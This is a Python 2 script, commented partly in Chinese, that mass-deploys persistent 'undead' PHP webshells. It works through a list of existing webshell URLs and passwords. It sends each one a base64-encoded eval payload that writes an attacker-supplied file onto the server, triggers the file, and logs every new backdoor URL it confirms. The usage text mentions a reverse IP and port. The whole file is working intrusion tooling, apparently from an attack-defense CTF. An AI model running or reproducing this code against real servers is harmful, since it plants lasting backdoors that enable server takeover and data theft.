#!/usr/bin/python
#coding=utf-8


import sys,requests,base64,re

def loadfile(filepath):
	try : 
		file = open(filepath,"rb")
		content = str(file.read())
		file.close()
		return content
	except : 
		print "File %s Not Found!" %filepath
		sys.exit()

def file_write(filepath,filecontent):
	file = open(filepath,"a")
	file.write(filecontent)
	file.close()

def postshell(url,method,passwd,upload_file,shellname,webshell):
	#print url
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=3)
	except : 
		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
		return 0
	if res.status_code!=200 :
		print "[-] %s Page Not Found!" %url
		return 0

	#执行命令 system, shell_exec, passthru,		exec, popen, `, proc_open
	# shellcode = base64.b64encode(crontab)
	# getshell_cmd = "system('echo %s | base64 -d > %s');" %(shellcode,shellname)
	file_content = str(open(upload_file,'rb').read())
	data={}
	# 上传文件
	if method=='get':
		# define your special password as pass
		#data['pass']='elliot@123'
		data[passwd]='@eval(base64_decode($_GET[z0]));'
		data['z0']='QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX0dFVFsiejEiXSk7CiRjPWJhc2U2NF9kZWNvZGUoJF9HRVRbInoyIl0pOwokYnVmPSIiOwpmb3IoJGk9MDskaTxzdHJsZW4oJGMpOyRpKz0xKQogICAgJGJ1Zi49c3Vic3RyKCRjLCRpLDEpOwplY2hvKEBmd3JpdGUoZm9wZW4oJGYsInciKSwkYnVmKSk7CmVjaG8oInw8LSIpOwpkaWUoKTs='
		data['z1']=base64.b64encode(shellname)
		data['z2']=base64.b64encode(file_content)
		res = requests.get(url,params=data,timeout=2)
		
	elif method=='post':
		# define your special password as pass
		data['pass']='elliot@123'
		data[passwd]='@eval(base64_decode($_POST[z0]));'
		data['z0']='QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRidWY9IiI7CmZvcigkaT0wOyRpPHN0cmxlbigkYyk7JGkrPTEpCiAgICAkYnVmLj1zdWJzdHIoJGMsJGksMSk7CmVjaG8oQGZ3cml0ZShmb3BlbigkZiwidyIpLCRidWYpKTsKZWNobygifDwtIik7CmRpZSgpOw=='
		data['z1']=base64.b64encode(shellname)
		data['z2']=base64.b64encode(file_content)
		res = requests.post(url,data=data,timeout=2)
		
	# 获取上传的不死马的url
	pattern = re.compile(r'(http://(\d+\.\d+\.\d+\.\d+)(:\d+)*/*(.*/)*)(.*\.php)*.*')
	# 分组获取 -- [当前路径, IP, Port, 相对路径, php文件名]
	pwd_path=re.findall(pattern,url)[0][0] + shellname
	try :
		# 激活不死马
		generate_webshell = requests.get(pwd_path,timeout=2)
		print "%s   upload Failed!"%pwd_path
		return 
	except requests.exceptions.ReadTimeout:
		# 访问超时则说明不死马存在
		pass
	except Exception:
		print "%s  something goes WRONG!" %pwd_path
	
	# 检验是否成功生成新的webshell
	# 获取新生成的小马路径
	pwd_path1 = re.findall(r'(http://.*/)', pwd_path)[0] + webshell
	verify = requests.get(pwd_path1,timeout=2)
	# 记录成功生成webshell的地址
	if verify.status_code==200:
		print "%s  webshell generated!" %pwd_path1
		file_write("./Wowoooo!!!.txt", "%s  webshell generated!\n" %pwd_path1)
	else:
		print "%s  webshell NOT work! plz check the webshell name" %pwd_path1

if __name__ == '__main__':
	# 获取系统输入
	if len(sys.argv) != 4:
		print "[*] Usage : "
		print "\tpython master.py [upload_file] [shellname] [webshell]"
		print "[*] Explain : "
		print "\tupload_file:\tfile to upload"
		print "\tshellname:\tthe new file's path and name to generate"
		print "\t\t\t[e.g.] haha.php  ../images/haha.php  ../../uploads/data/get.php"
		print "\twebshell:\tnew webshell filename, which ALREADY modified in undead.php by $file"
		print "\n[*] ATTENTION : "
		print "\tDO modify the reverse IP and PORT!!!\n"
		exit(1)
	upload_file = sys.argv[1]
	shellname = sys.argv[2]
	webshell = sys.argv[3]

	# 存放webshell的文件
	shellstr=loadfile("./webshell.txt")
	list = shellstr.split("\r\n")
	#print str(list)
	i = 0
	url={}
	passwd={}
	method={}
	for data in list:
		if data:
			ls = data.split(",")
			method_tmp = str(ls[1])
			method_tmp = method_tmp.lower()
			if method_tmp=='post' or method_tmp=='get':
				url[i]=str(ls[0])
				method[i]=method_tmp
				passwd[i]=str(ls[2])
				i+=1
			else :
				print "[-] %s request method error!" %(str(ls[0]))
		else : 
			pass

	for j in range(len(url)):
		#调用执行命令的模块
		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
		postshell(url=url[j],method=method[j],passwd=passwd[j],upload_file=upload_file,shellname=shellname,webshell=webshell)
	file_write("./Wowoooo!!!.txt","\n\n")
	print "\nAll Finished!"
